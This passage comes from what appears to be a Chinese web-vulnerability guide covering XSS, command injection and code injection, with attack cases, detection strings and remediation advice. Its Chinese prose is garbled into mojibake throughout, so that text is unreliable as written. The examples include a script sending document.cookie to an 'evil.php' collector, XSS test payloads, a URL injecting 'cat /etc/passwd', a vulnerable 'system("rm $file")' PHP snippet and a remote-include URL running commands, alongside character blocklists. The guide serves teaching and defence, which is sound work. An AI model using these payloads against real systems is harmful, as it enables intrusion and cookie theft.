åŠ«æŒç”¨æˆ·ï¼ˆæµè§ˆå™¨ï¼‰ä¼šè¯ï¼Œä»Žè€Œæ‰§è¡Œä»»æ„æ“ä½œï¼Œä¾‹å¦‚è¿›è¡Œéžæ³•è½¬è´¦ï¼Œå¼ºåˆ¶å‘è¡¨æ—¥å¿—ï¼Œå‘é€ç”µå­é‚®ä»¶ç­‰ å¼ºåˆ¶å¼¹å‡ºå¹¿å‘Šé¡µé¢ï¼Œåˆ·æµé‡ç­‰ ç½‘é¡µæŒ‚é©¬ è¿›è¡Œæ¶æ„æ“ä½œï¼Œä¾‹å¦‚ä»»æ„ç¯¡æ”¹é¡µé¢ä¿¡æ¯ï¼Œåˆ é™¤æ–‡ç« ç­‰ è¿›è¡Œå¤§é‡çš„å®¢æˆ·ç«¯æ”»å‡»ï¼Œå¦‚DDOSæ”»å‡» èŽ·å–å®¢æˆ·ç«¯ä¿¡æ¯ï¼Œä¾‹å¦‚ç”¨æˆ·çš„æµè§ˆåŽ†å²ï¼ŒçœŸå®žipï¼Œå¼€æ”¾ç«¯å£ç­‰ æŽ§åˆ¶å—å®³è€…æœºå™¨å‘å…¶ä»–ç½‘ç«™å‘èµ·æ”»å‡» ç»“åˆå…¶ä»–æ¼æ´žè¿›ä¸€æ­¥æ‰©å¤§æ”»å‡» æå‡ç”¨æˆ·æƒé™ï¼ŒåŒ…æ‹¬è¿›ä¸€æ­¥æ¸—é€ç½‘ç«™ ä¼ æ’­XSSè·¨ç«™è„šæœ¬è •è™«ç­‰ æ”»å‡»æ¡ˆä¾‹ åœºæ™¯1ï¼šä»¥ä¸‹JSPä»£ç æ®µä»ŽHTTPè¯·æ±‚è¯»å–å‘˜å·¥ID eidï¼Œå¹¶å°†å…¶æ˜¾ç¤ºç»™ç”¨æˆ·ã€‚ 123&lt;% String eid = request.getParameter("eid"); %&gt;... Employee ID: &lt;%= eid %&gt; å¦‚æžœeidä»…åŒ…å«æ ‡å‡†å­—æ¯æ•°å­—æ–‡æœ¬ï¼Œåˆ™æ­¤ç¤ºä¾‹ä¸­çš„ä»£ç å°†æ­£ç¡®è¿è¡Œã€‚å¦‚æžœeidçš„å€¼åŒ…å«å…ƒå­—ç¬¦æˆ–æºä»£ç ï¼Œåˆ™è¯¥ä»£ç å°†ç”±Webæµè§ˆå™¨æ‰§è¡Œï¼Œå› ä¸ºå®ƒæ˜¾ç¤ºHTTPå“åº”ã€‚ åœºæ™¯2ï¼šèŽ·å–ç›®æ ‡ç”¨æˆ·Cookie å¦‚æžœåº”ç”¨ç¨‹åºä¸éªŒè¯è¾“å…¥æ•°æ®ï¼Œåˆ™æ”»å‡»è€…å¯ä»¥è½»æ¾åœ°ä»Žç»è¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·é‚£é‡Œçªƒå–cookieã€‚æ”»å‡»è€…æ‰€éœ€è¦åšçš„å°±æ˜¯å°†ä»¥ä¸‹ä»£ç æ”¾ç½®åœ¨ä»»ä½•å¼ è´´çš„è¾“å…¥ä¸­ï¼ˆå³ï¼šç•™è¨€æ¿ï¼Œç§äººæ¶ˆæ¯ï¼Œç”¨æˆ·ä¸ªäººèµ„æ–™ï¼‰ï¼š 123&lt;SCRIPT type="text/javascript"&gt;var adr = '../evil.php?cakemonster=' + escape(document.cookie);&lt;/SCRIPT&gt; ä¸Šé¢çš„ä»£ç ä¼šå°†cookieçš„è½¬ä¹‰å†…å®¹ï¼ˆæ ¹æ®RFCå†…å®¹å¿…é¡»å…ˆè½¬ä¹‰ï¼Œç„¶åŽæ‰é€šè¿‡GETæ–¹æ³•é€šè¿‡HTTPåè®®å°†å…¶å‘é€ï¼‰ä¼ é€’ç»™â€œcakemonsterâ€å˜é‡ä¸­çš„evil.phpè„šæœ¬ã€‚æ”»å‡»è€…ç„¶åŽæ£€æŸ¥å…¶evil.phpè„šæœ¬çš„ç»“æžœï¼ˆcookieæŠ“å–ç¨‹åºè„šæœ¬é€šå¸¸ä¼šå°†cookieå†™å…¥æ–‡ä»¶ï¼‰å¹¶ä½¿ç”¨å®ƒã€‚ æ£€æµ‹æ–¹æ³• XSSå¸¸è§æµ‹è¯•è¯­å¥ï¼š 1234&lt;script&gt;alert(xss)&lt;/script&gt;&lt;img src=x onerror=alert(xss)&gt;&lt;svg onloda=alert(xss)&gt;&lt;a href=javascript:alert(xss)&gt; ä¿®å¤å»ºè®® æ‹’ç»å°†ä¸å—ä¿¡ä»»çš„æ•°æ®æ”¾å…¥HTMLæ–‡æ¡£ä¸­ï¼ŒéªŒè¯æ‰€æœ‰ç”¨æˆ·è¾“å…¥æ•°æ®ï¼Œæœ‰æ•ˆæ£€æµ‹æ”»å‡»ï¼›å¯¹æ‰€æœ‰è¾“å‡ºæ•°æ®è¿›è¡Œé€‚å½“çš„ç¼–ç ï¼Œä»¥é˜²æ­¢ä»»ä½•å·²æˆåŠŸæ³¨å…¥çš„è„šæœ¬åœ¨æµè§ˆå™¨ç«¯è¿è¡Œã€‚ å°†ä¸å—ä¿¡ä»»çš„æ•°æ®æ’å…¥HTMLå…ƒç´ å†…å®¹ä¹‹å‰è¿›è¡ŒHTMLè½¬ä¹‰ã€‚åœ¨è§„èŒƒä¸­å»ºè®®ä½¿ç”¨å‘½åå®žä½“è¿›è¡Œè½¬ä¹‰ï¼š 123456&amp; --&gt; &amp;amp;&lt; --&gt; &amp;lt;&gt; --&gt; &amp;gt;" --&gt; &amp;quot;' --&gt; &amp;#x27;/ --&gt; &amp;#x2F; HTMLå±žæ€§ç¼–ç è½¬ä¹‰ï¼šé™¤å­—æ¯æ•°å­—å­—ç¬¦å¤–ï¼Œè¯·ä»¥HTMLå®žä½“&amp;#xHH;æ ¼å¼è½¬ä¹‰æ‰€æœ‰å­—ç¬¦ï¼ŒåŒ…æ‹¬ç©ºæ ¼ï¼ˆHH=åå…­è¿›åˆ¶å€¼ï¼‰ã€‚ URLç¼–ç ï¼šå¯¹URLå‚æ•°å€¼è¿›è¡ŒURLç¼–ç ã€‚URLç¼–ç æ ‡å‡†ï¼Œå‚è€ƒ https://www.w3schools.com/tags/ref_urlencode.aspã€‚ JavaScriptç¼–ç ï¼šé™¤å­—æ¯æ•°å­—å­—ç¬¦å¤–ï¼Œè¯·ä»¥\uXXXX Unicodeè½¬ä¹‰æ ¼å¼ï¼ˆX =æ•´æ•°ï¼‰è½¬ä¹‰æ‰€æœ‰å­—ç¬¦ã€‚ CSSåå…­è¿›åˆ¶ç¼–ç ï¼šCSSè½¬ä¹‰æ”¯æŒ\XXå’Œ\XXXXXXã€‚å¦‚æžœä¸‹ä¸€ä¸ªå­—ç¬¦ç»§ç»­è½¬ä¹‰åºåˆ—ï¼Œåˆ™ä½¿ç”¨ä¸¤ä¸ªå­—ç¬¦è½¬ä¹‰ä¼šå¯¼è‡´é—®é¢˜ã€‚æœ‰ä¸¤ç§è§£å†³æ–¹æ¡ˆï¼ˆaï¼‰åœ¨CSSè½¬ä¹‰ç¬¦åŽæ·»åŠ ä¸€ä¸ªç©ºæ ¼ï¼ˆCSSè§£æžå™¨å°†å¿½ç•¥è¯¥ç©ºæ ¼ï¼‰ï¼ˆbï¼‰ä½¿ç”¨é€šè¿‡é›¶å¡«å……è¯¥å€¼è€Œå¯èƒ½çš„å…¨éƒ¨CSSè½¬ä¹‰ã€‚ è¿‡æ»¤ä»¥ä¸‹å¸¸è§å­—ç¬¦ï¼š 1234567891011121314151617|&amp; ; $%@'"\'\"&lt;&gt;()+CRï¼ˆå›žè½¦ç¬¦ï¼ŒASCII 0x0dï¼‰LFï¼ˆæ¢è¡Œï¼ŒASCII 0x0aï¼‰,\ å‘½ä»¤æ³¨å…¥æ¼æ´žæè¿° å‘½ä»¤æ³¨å…¥æ˜¯ä¸€ç§æ”»å‡»ï¼Œå…¶ç›®æ ‡æ˜¯é€šè¿‡æ˜“å—æ”»å‡»çš„åº”ç”¨ç¨‹åºåœ¨ä¸»æœºæ“ä½œç³»ç»Ÿä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚å½“åº”ç”¨ç¨‹åºå°†ä¸å®‰å…¨çš„ç”¨æˆ·æä¾›çš„æ•°æ®ï¼ˆè¡¨å•ï¼Œcookieï¼ŒHTTPæ ‡å¤´ç­‰ï¼‰ä¼ é€’ç»™ç³»ç»Ÿshellæ—¶ï¼Œå¯èƒ½ä¼šå‘ç”Ÿå‘½ä»¤æ³¨å…¥æ”»å‡»ã€‚åœ¨æ­¤æ”»å‡»ä¸­ï¼Œæ”»å‡»è€…æä¾›çš„æ“ä½œç³»ç»Ÿå‘½ä»¤é€šå¸¸ä»¥æ˜“å—æ”»å‡»çš„åº”ç”¨ç¨‹åºçš„æƒé™æ‰§è¡Œã€‚å‘½ä»¤æ³¨å…¥æ”»å‡»å¾ˆå¯èƒ½ä¸»è¦æ˜¯ç”±äºŽè¾“å…¥éªŒè¯ä¸è¶³ã€‚ ç³»ç»Ÿå‘½ä»¤æ³¨å…¥ï¼ˆä¹Ÿç§°ä¸ºshellæ³¨å…¥ï¼‰æ˜¯ä¸€ä¸ªWebå®‰å…¨æ¼æ´žï¼Œå®ƒä½¿æ”»å‡»è€…å¯ä»¥åœ¨è¿è¡Œåº”ç”¨ç¨‹åºçš„æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ç³»ç»Ÿï¼ˆOSï¼‰å‘½ä»¤ï¼Œå¹¶ä¸”é€šå¸¸ä¼šå®Œå…¨ç ´åè¯¥åº”ç”¨ç¨‹åºåŠå…¶æ‰€æœ‰æ•°æ®ã€‚æ”»å‡»è€…é€šå¸¸å¯ä»¥åˆ©ç”¨OSå‘½ä»¤æ³¨å…¥æ¼æ´žæ¥ç ´åæ‰˜ç®¡åŸºç¡€æž¶æž„çš„å…¶ä»–éƒ¨åˆ†ï¼Œåˆ©ç”¨ä¿¡ä»»å…³ç³»å°†æ”»å‡»è½¬ç§»åˆ°ç»„ç»‡å†…çš„å…¶ä»–ç³»ç»Ÿã€‚ æ¼æ´žå±å®³ å½“åº”ç”¨ç¨‹åºå°†ä¸å®‰å…¨çš„ç”¨æˆ·æä¾›çš„æ•°æ®ï¼ˆè¡¨å•ï¼Œcookieï¼ŒHTTPæ ‡å¤´ç­‰ï¼‰ä¼ é€’ç»™ç³»ç»Ÿshellæ—¶ï¼Œå¯èƒ½ä¼šå‘ç”Ÿå‘½ä»¤æ³¨å…¥æ”»å‡»ã€‚åœ¨æ­¤æ”»å‡»ä¸­ï¼Œæ”»å‡»è€…æä¾›çš„æ“ä½œç³»ç»Ÿå‘½ä»¤é€šå¸¸ä»¥æ˜“å—æ”»å‡»çš„åº”ç”¨ç¨‹åºçš„æƒé™æ‰§è¡Œã€‚ æ”»å‡»è€…å¯ä»¥æ‰§è¡Œæœªç»æŽˆæƒçš„å‘½ä»¤ï¼Œç„¶åŽå¯ä»¥ä½¿ç”¨è¿™äº›å‘½ä»¤æ¥ç¦ç”¨ç›®æ ‡ç³»ç»Ÿçš„åº”ç”¨è½¯ä»¶ï¼Œæˆ–è€…è¯»å–å’Œä¿®æ”¹æ”»å‡»è€…æ²¡æœ‰æƒé™ç›´æŽ¥è®¿é—®çš„æ•°æ®ã€‚ æˆåŠŸåˆ©ç”¨æ­¤æ¼æ´žä¼šé€ æˆï¼šæ‰§è¡Œæœªç»æŽˆæƒçš„ä»£ç æˆ–å‘½ä»¤ï¼›DoSï¼šå´©æºƒï¼Œé€€å‡ºæˆ–é‡æ–°å¯åŠ¨ï¼›è¯»å–/ä¿®æ”¹æ–‡ä»¶æˆ–ç›®å½•ï¼›è¯»å–åº”ç”¨æ•°æ®ï¼›ä¿®æ”¹ç”³è¯·æ•°æ®ï¼› æ”»å‡»æ¡ˆä¾‹ å‘½ä»¤æ³¨å…¥æ¼æ´žé€šå¸¸åœ¨ä»¥ä¸‹æƒ…å†µä¸‹å‘ç”Ÿï¼š æ•°æ®ä»Žä¸å—ä¿¡ä»»çš„æ¥æºè¿›å…¥åº”ç”¨ç¨‹åºã€‚ æ•°æ®æ˜¯ç”±åº”ç”¨ç¨‹åºä½œä¸ºå‘½ä»¤æ‰§è¡Œçš„å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ã€‚ é€šè¿‡æ‰§è¡Œå‘½ä»¤ï¼Œåº”ç”¨ç¨‹åºä¸ºæ”»å‡»è€…æä¾›äº†æ”»å‡»è€…æ— æ³•æ‹¥æœ‰çš„ç‰¹æƒæˆ–åŠŸèƒ½ã€‚ åœºæ™¯1ï¼šåœ¨.PHPé¡µé¢çš„URLæœ«å°¾æ·»åŠ åˆ†å·ï¼ŒåŽè·Ÿæ“ä½œç³»ç»Ÿå‘½ä»¤ï¼Œå°†æ‰§è¡Œè¯¥å‘½ä»¤ã€‚%3B URLç¼–ç å¹¶è§£ç ä¸ºåˆ†å·ã€‚ 1http://sensitive/something.php?dir=%3Bcat%20/etc/passwd åœºæ™¯2ï¼šä»¥ä¸‹PHPä»£ç æ®µå®¹æ˜“å—åˆ°å‘½ä»¤æ³¨å…¥æ”»å‡»ï¼š 123456&lt;?phpprint("Please specify the name of the file to delete");print("&lt;p&gt;");$file=$_GET['filename'];system("rm $file");?&gt; è¯·æ±‚å’Œå“åº”æ˜¯æˆåŠŸæ”»å‡»çš„ç¤ºä¾‹ï¼š 12345&lt;!--è¯·æ±‚--&gt;http://127.0.0.1/delete.php?filename=bob.txt;id&lt;!--å“åº”--&gt;Please specify the name of the file to deleteuid=33(www-data) gid=33(www-data) groups=33(www-data) æ£€æµ‹æ–¹æ³• cmd1|cmd2ï¼šä½¿ç”¨|å°†ä½¿å‘½ä»¤2æ‰§è¡ŒæˆåŠŸï¼Œè€Œå‘½ä»¤1æ‰§è¡ŒæˆåŠŸä¸Žå¦ã€‚ cmd1;cmd2ï¼šä½¿ç”¨;å°†ä½¿å‘½ä»¤2æ‰§è¡ŒæˆåŠŸï¼Œè€Œå‘½ä»¤1æ‰§è¡ŒæˆåŠŸä¸Žå¦ã€‚ cmd1||cmd2 ï¼šä»…å½“å‘½ä»¤1æ‰§è¡Œå¤±è´¥æ—¶ï¼Œæ‰ä¼šæ‰§è¡Œå‘½ä»¤2ã€‚ cmd1&amp;&amp;cmd2 ï¼šä»…å½“å‘½ä»¤1æ‰§è¡ŒæˆåŠŸæ—¶ï¼Œæ‰ä¼šæ‰§è¡Œå‘½ä»¤2ã€‚ $(cmd)ï¼šä¾‹å¦‚ï¼Œecho $(whoami)æˆ–$(touch test.sh; echo &#39;ls&#39; &gt; test.sh) cmdï¼šç”¨äºŽæ‰§è¡Œç‰¹å®šå‘½ä»¤ã€‚ä¾‹å¦‚ï¼Œwhoami &gt;(cmd)ï¼š &gt;(ls) &lt;(cmd)ï¼š&lt;(ls) ä¿®å¤å»ºè®® éœ€è¦æ¸…ç†URLå’Œè¡¨å•æ•°æ®ä¸­çš„æ— æ•ˆå­—ç¬¦ã€‚å¯ä»¥å°†å­—ç¬¦åˆ—å…¥é»‘åå•ï¼Œä½†æ˜¯å¯èƒ½å¾ˆéš¾æƒ³åˆ°è¦é’ˆå¯¹å…¶è¿›è¡ŒéªŒè¯çš„æ‰€æœ‰å­—ç¬¦ã€‚ä¹Ÿå¯èƒ½æœ‰ä¸€äº›å°šæœªè¢«å‘çŽ°ã€‚åº”è¯¥åˆ›å»ºä»…åŒ…å«å…è®¸çš„å­—ç¬¦æˆ–å‘½ä»¤åˆ—è¡¨çš„ç™½åå•ï¼Œä»¥éªŒè¯ç”¨æˆ·è¾“å…¥ã€‚æ­¤åˆ—è¡¨åº”æ¶ˆé™¤é”™è¿‡çš„è§’è‰²ä»¥åŠæœªå‘çŽ°çš„å¨èƒã€‚ å¯ä»¥åŒ…æ‹¬ç”¨äºŽå‘½ä»¤æ³¨å…¥çš„å¸¸è§„é»‘åå•ï¼š 1| ; &amp; $ &gt; &lt; &apos; \ ! &gt;&gt; # å¯¹äºŽWindowsè½¬ä¹‰æˆ–è¿‡æ»¤ä»¥ä¸‹ç‰¹æ®Šå­—ç¬¦ï¼š 1( ) &lt; &gt; &amp; * â€˜ | = ? ; [ ] ^ ~ ! . â€ % @ / \ : + , å¯¹äºŽLinuxï¼Œè½¬ä¹‰æˆ–è¿‡æ»¤ä»¥ä¸‹ç‰¹æ®Šå­—ç¬¦ï¼š 1&#123; &#125; ( ) &gt; &lt; &amp; * â€˜ | = ? ; [ ] $ â€“ # ~ ! . â€ % / \ : +`, å®¡æŸ¥ä»¥ä¸‹å‡½æ•° Java 1Runtime.exec() C/C++ 123systemexecShellExecute Python 123456execevalos.systemos.popensubprocess.popensubprocess.call PHP 12345sytemshell_execexecproc_openeval â€‹ ï¼ˆ1ï¼‰å°½é‡ä¸è¦æ‰§è¡Œå¤–éƒ¨çš„åº”ç”¨ç¨‹åºæˆ–å‘½ä»¤ï¼Œä¸¥æ ¼è¿‡æ»¤ç”¨æˆ·è¾“å…¥çš„æ•°æ®ï¼Œç¦æ­¢æ‰§è¡Œéžé¢„æœŸç³»ç»Ÿå‘½ä»¤ã€‚ â€‹ ï¼ˆ2ï¼‰ä½¿ç”¨è‡ªå®šä¹‰å‡½æ•°æˆ–å‡½æ•°åº“å®žçŽ°å¤–éƒ¨åº”ç”¨ç¨‹åºæˆ–å‘½ä»¤çš„åŠŸèƒ½ã€‚ â€‹ ï¼ˆ3ï¼‰åœ¨æ‰§è¡Œsystemã€evalç­‰å‘½ä»¤æ‰§è¡ŒåŠŸèƒ½çš„å‡½æ•°å‰ï¼Œç¡®å®šå‚æ•°å†…å®¹ã€‚ â€‹ ï¼ˆ4ï¼‰ä½¿ç”¨escapeshellargå‡½æ•°å¤„ç†ç›¸å…³å‚æ•°ã€‚Escapeshellargå‡½æ•°ä¼šå°†ä»»ä½•å¼•èµ·å‚æ•°æˆ–å‘½ä»¤ç»“æŸçš„å­—ç¬¦è¿›è¡Œè½¬ä¹‰ï¼Œå¦‚å•å¼•å·â€œâ€™â€ä¼šè¢«è½¬ä¹‰ä¸ºâ€œ\â€™â€ï¼ŒåŒå¼•å·â€œâ€â€ä¼šè¢«è½¬ä¹‰ä¸ºâ€œ\â€â€ï¼Œåˆ†å·â€œ;â€ä¼šè¢«è½¬ä¹‰ä¸ºâ€œ\;â€ï¼Œè¿™æ ·escapeshellargä¼šå°†å‚æ•°å†…å®¹é™åˆ¶åœ¨ä¸€å¯¹å•å¼•å·æˆ–åŒå¼•å·é‡Œé¢ï¼Œè½¬ä¹‰å‚æ•°ä¸­æ‰€åŒ…å«çš„å•å¼•å·æˆ–åŒå¼•å·ï¼Œä½¿å…¶æ— æ³•å¯¹å½“å‰æ‰§è¡Œè¿›è¡Œæˆªæ–­ï¼Œå®žçŽ°é˜²èŒƒå‘½ä»¤æ³¨å…¥æ”»å‡»çš„ç›®çš„ã€‚ â€‹ ï¼ˆ5ï¼‰ä½¿ç”¨safe_mode_exec_diræ‰§è¡Œå¯æ‰§è¡Œçš„æ–‡ä»¶è·¯å¾„ã€‚å°†php.iniæ–‡ä»¶ä¸­çš„safe_modeè®¾ç½®ä¸ºOnï¼Œç„¶åŽå°†å…è®¸æ‰§è¡Œçš„æ–‡ä»¶æ”¾å…¥ä¸€ä¸ªç›®å½•ä¸­ï¼Œå¹¶ä½¿ç”¨safe_mode_exec_diræŒ‡å®šè¿™ä¸ªå¯æ‰§è¡Œçš„æ–‡ä»¶è·¯å¾„ã€‚è¿™æ ·ï¼Œåœ¨éœ€è¦æ‰§è¡Œç›¸åº”çš„å¤–éƒ¨ç¨‹åºæ—¶ï¼Œç¨‹åºå¿…é¡»åœ¨safe_mode_exec_diræŒ‡å®šçš„ç›®å½•ä¸­æ‰ä¼šå…è®¸æ‰§è¡Œï¼Œå¦åˆ™æ‰§è¡Œå°†å¤±è´¥ã€‚ ä»£ç æ³¨å…¥æ¼æ´žæè¿° ç”¨æˆ·é€šè¿‡æµè§ˆå™¨æäº¤æ‰§è¡Œå‘½ä»¤ï¼Œç”±äºŽæœåŠ¡å™¨ç«¯æ²¡æœ‰é’ˆå¯¹æ‰§è¡Œå‡½æ•°åšè¿‡æ»¤ï¼Œå¯¼è‡´åœ¨æ²¡æœ‰æŒ‡å®šç»å¯¹è·¯å¾„çš„æƒ…å†µä¸‹å°±æ‰§è¡Œå‘½ä»¤ï¼Œå¯èƒ½ä¼šå…è®¸æ”»å‡»è€…é€šè¿‡æ”¹å˜ $PATH æˆ–ç¨‹åºæ‰§è¡ŒçŽ¯å¢ƒçš„å…¶ä»–æ–¹é¢æ¥æ‰§è¡Œä¸€ä¸ªæ¶æ„æž„é€ çš„ä»£ç ã€‚ä»£ç ä»¥ç›®æ ‡åº”ç”¨ç¨‹åºçš„è¯­è¨€æ³¨å…¥ï¼Œå¹¶ç”±è¯¥è¯­è¨€çš„æœåŠ¡å™¨ç«¯è§£é‡Šå™¨æ‰§è¡Œâ€”â€”PHPï¼ŒPythonï¼ŒJavaï¼ŒPerlï¼ŒRubyç­‰ã€‚ ä»£ç æ³¨å…¥ä¸Žå‘½ä»¤æ³¨å…¥çš„ä¸åŒä¹‹å¤„åœ¨äºŽï¼Œæ”»å‡»è€…ä»…å—æ³¨å…¥è¯­è¨€æœ¬èº«çš„åŠŸèƒ½çš„é™åˆ¶ã€‚å¦‚æžœæ”»å‡»è€…èƒ½å¤Ÿå°†PHPä»£ç æ³¨å…¥åˆ°åº”ç”¨ç¨‹åºä¸­å¹¶æ‰§è¡Œè¯¥ä»£ç ï¼Œåˆ™å®ƒä»¬ä»…å—PHPèƒ½åŠ›çš„é™åˆ¶ã€‚å‘½ä»¤æ³¨å…¥åŒ…æ‹¬åˆ©ç”¨çŽ°æœ‰ä»£ç æ¥æ‰§è¡Œå‘½ä»¤ï¼Œé€šå¸¸æ˜¯åœ¨shellä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚ æ¼æ´žå±å®³ é€šè¿‡æ³¨å…¥çš„ä»£ç å¯ä»¥è®¿é—®ç›´æŽ¥é˜»æ­¢æ”»å‡»è€…è®¿é—®çš„èµ„æºã€‚ æˆåŠŸæ‰§è¡Œä»£ç æ³¨å…¥æ”»å‡»éƒ½å¯èƒ½å¯¼è‡´æ•°æ®å®Œæ•´æ€§ä¸§å¤±ã€æœºå¯†æ€§ä¸§å¤±ï¼Œå› ä¸ºæ³¨å…¥çš„ä»£ç æ•°æ®å§‹ç»ˆä¸Žæ•°æ®è°ƒç”¨æˆ–å†™å…¥æœ‰å…³ã€‚æ­¤å¤–ï¼Œä»£ç æ³¨å…¥é€šå¸¸å¯ä»¥å¯¼è‡´æ‰§è¡Œä»»æ„ä»£ç ã€‚ æˆåŠŸæ‰§è¡Œä»£ç æ³¨å…¥å¯ä»¥ç»•è¿‡èº«ä»½éªŒè¯ã€‚ æ”»å‡»æ¡ˆä¾‹ åœºæ™¯1ï¼šå½“å¼€å‘äººå‘˜ä½¿ç”¨PHP eval()å‡½æ•°å¹¶å‘å…¶ä¼ é€’æ”»å‡»è€…å¯ä»¥ä¿®æ”¹çš„ä¸å—ä¿¡ä»»çš„æ•°æ®æ—¶ï¼Œå¯èƒ½ä¼šæ³¨å…¥ä»£ç ã€‚ â€‹ ä¸‹é¢çš„ç¤ºä¾‹æ˜¾ç¤ºäº†ä½¿ç”¨eval()å‡½æ•°çš„å±é™©æ–¹å¼ï¼š1$myvar = "varname"; $x = $_GET['arg']; eval("\$myvar = \$x;"); â€‹ ç”±äºŽæ²¡æœ‰è¾“å…¥éªŒè¯ï¼Œå› æ­¤ä¸Šé¢çš„ä»£ç å®¹æ˜“å—åˆ°ä»£ç æ³¨å…¥æ”»å‡»ã€‚ â€‹ ä¾‹å¦‚ï¼š1/index.php?arg=1; phpinfo() â€‹ åœ¨åˆ©ç”¨æ­¤ç±»é”™è¯¯æ—¶ï¼Œæ”»å‡»è€…å¯èƒ½æƒ³è¦æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä»£ç æ³¨å…¥é”™è¯¯ä¹Ÿå¯ä»¥ç”¨äºŽå‘½ä»¤æ³¨å…¥ï¼Œä¾‹å¦‚ï¼š1/index.php?arg=1; system('id') æ£€æµ‹æ–¹æ³• æµ‹è¯•PHPæ³¨å…¥æ¼æ´ž ä½¿ç”¨æŸ¥è¯¢å­—ç¬¦ä¸²ï¼Œæµ‹è¯•äººå‘˜å¯ä»¥æ³¨å…¥è¦å¤„ç†çš„ä»£ç ï¼ˆåœ¨æ­¤ç¤ºä¾‹ä¸­ä¸ºæ¶æ„URLï¼‰ï¼Œä½œä¸ºæ‰€åŒ…å«æ–‡ä»¶çš„ä¸€éƒ¨åˆ†ï¼š 1http://www.example.com/uptime.php?pin=http://www.example2.com/packx1/cs.jpg?&amp;cmd=uname%20-a æ¶æ„URLè¢«æŽ¥å—ä¸ºPHPé¡µé¢çš„å‚æ•°ï¼Œè¯¥é¡µé¢ç¨åŽå°†ä½¿ç”¨åŒ…å«æ–‡ä»¶ä¸­çš„å€¼ã€‚ ä¿®å¤å»ºè®® éªŒè¯å’Œæ¸…é™¤è¾“å…¥ï¼šæ‰«æè½¬ä¹‰å­—ç¬¦åº”ç”¨ç¨‹åºè¯­è¨€å’Œæ“ä½œç³»ç»Ÿçš„å…¶ä»–ç‰¹æ®Šç¬¦å·ï¼Œä¾‹å¦‚æ³¨é‡Šæ ‡è®°ï¼Œè¡Œç»ˆæ­¢å­—ç¬¦å’Œå‘½ä»¤å®šç•Œç¬¦ã€‚å¦‚æžœåº”ç”¨ç¨‹åºåªå¸Œæœ›ä½¿ç”¨ä¸€ç»„æœ‰é™çš„å€¼ï¼Œè¯·ä»…æŽ¥å—è¿™äº›å€¼ï¼Œä¾‹å¦‚é€šè¿‡å°†å…¶åˆ—å…¥ç™½åå•æˆ–æœ‰æ¡ä»¶åœ°å°†å…¶æ”¾è¡Œã€‚ é¿å…ä½¿ç”¨è„†å¼±çš„è¯„ä¼°æž„é€ ï¼šå°½å¯èƒ½é¿å…åœ¨åŽŸå§‹ç”¨æˆ·è¾“å…¥ä¸Šä½¿ç”¨eval()å’Œç­‰æ•ˆå‡½æ•°ã€‚ä½¿ç”¨ç‰¹å®šäºŽè¯­è¨€çš„ä¸“ç”¨åŠŸèƒ½æ¥å®‰å…¨å¤„ç†ç”¨æˆ·æä¾›çš„å‚æ•°ã€‚ å°†æ‰€æœ‰è¾“å…¥æ•°æ®è§†ä¸ºä¸å¯ä¿¡ï¼šè¯·æ³¨æ„ç”¨æˆ·å¯ä»¥ä¸ºåº”ç”¨ç¨‹åºæä¾›æˆ–å¤„ç†æ•°æ®çš„æ‰€æœ‰ä½ç½®ã€‚é™¤äº†æŸ¥è¯¢å­—ç¬¦ä¸²å’ŒHTMLè¡¨å•ä¹‹ç±»çš„æ˜Žæ˜¾æ³¨å…¥å‘é‡ä¹‹å¤–ï¼Œè¿˜å¯ä»¥é€šè¿‡ç‰¹åˆ¶æ•°æ®æ–‡ä»¶ï¼Œæ‰‹åŠ¨ä¿®æ”¹çš„cookieå’Œå…¶ä»–æ–¹æ³•æ³¨å…¥ä»£ç ã€‚ é™åˆ¶è§£é‡Šå™¨ï¼šå¦‚æžœæ‚¨å¯ä»¥æŽ§åˆ¶æœåŠ¡å™¨é…ç½®ï¼Œåˆ™å¯èƒ½éœ€è¦å°†è§£é‡Šå™¨åŠŸèƒ½é™åˆ¶ä¸ºåº”ç”¨ç¨‹åºæ‰€éœ€çš„æœ€ä½Žé™åº¦ï¼Œä»¥é˜²æ­¢å‡çº§ä¸ºç³»ç»Ÿå‘½ä»¤æ³¨å…¥ã€‚ä¾‹å¦‚ï¼Œå¦‚æžœPHPåº”ç”¨ç¨‹åºä¸ä½¿ç”¨system()å‡½æ•°ï¼Œåˆ™å¯ä»¥é€šè¿‡åœ¨disable_functionsæŒ‡ä»¤ä¸­å¯¹å…¶è¿›è¡ŒæŒ‡å®šæ¥åœ¨php.iniæ–‡ä»¶ä¸­ç¦ç”¨è¯¥å‡½æ•°ã€‚é€šå¸¸ç¦ç”¨çš„PHPå‡½æ•°åŒ…æ‹¬ï¼šexec()ï¼Œpassthru()ï¼Œshell_exec()ï¼Œsystem()ï¼Œproc_open()ï¼Œpopen()ï¼Œcurl_exec()ï¼Œcurl_multi_exec()ï¼Œparse_ini_file()å’Œshow_source()ã€‚ æ£€æŸ¥ä»£ç ï¼šä½¿ç”¨é™æ€ä»£ç æ£€æŸ¥å·¥å…·æ‰«æä¸Žè¾“å…¥éªŒè¯å’Œä¸å®‰å…¨è¯„ä¼°æœ‰å…³çš„æ¼æ´žã€‚ æ‰«æåº”ç”¨ç¨‹åºï¼šä½¿ç”¨åŠ¨æ€Webæ¼æ´žæ‰«æç¨‹åºä»¥ç¡®ä¿åº”ç”¨ç¨‹åºä¸å—å„ç§ç±»åž‹çš„æ”»å‡»ï¼ˆåŒ…æ‹¬ä»£ç æ³¨å…¥ï¼‰çš„å½±å“ã€‚ SQLæ³¨å…¥æ¼æ´žæè¿° 